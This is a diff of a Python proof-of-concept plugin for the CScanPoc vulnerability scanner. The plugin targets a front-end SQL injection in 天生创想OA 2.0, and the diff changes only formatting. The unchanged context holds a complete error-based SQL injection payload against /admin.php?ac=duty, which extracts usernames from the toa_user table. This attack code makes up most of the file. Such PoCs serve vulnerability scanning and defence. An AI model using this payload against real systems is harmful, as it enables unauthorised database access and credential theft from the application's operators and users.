@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Chuangxiang_0002_L' # 平台漏洞编号，留空
+    vuln_id = 'Chuangxiang_0002_L'  # 平台漏洞编号，留空
     name = '天生创想OA 2.0前台用户SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-04-02'  # 漏洞公布时间
     desc = '''
         天生创想OA 2.0 /duty/mod_duty.php 中：
@@ -37,13 +38,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #前台用户登入后
+
+            # 前台用户登入后
             s = requests.session()
             s.get(self.target)
             payload = "/admin.php?ac=duty&fileurl=duty&menuid=31&number=123%20and%20(select%201%20from(select%20count(*),concat((select%20(select%20(SELECT%20distinct%20concat(username,md5(c))%20FROM%20toa_user%20LIMIT%200,1))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)"
             url = self.target + payload
-            r = s.get(url) 
+            r = s.get(url)
 
             if '4a8a08f09d37b73795649038408b5f33' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -54,6 +55,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
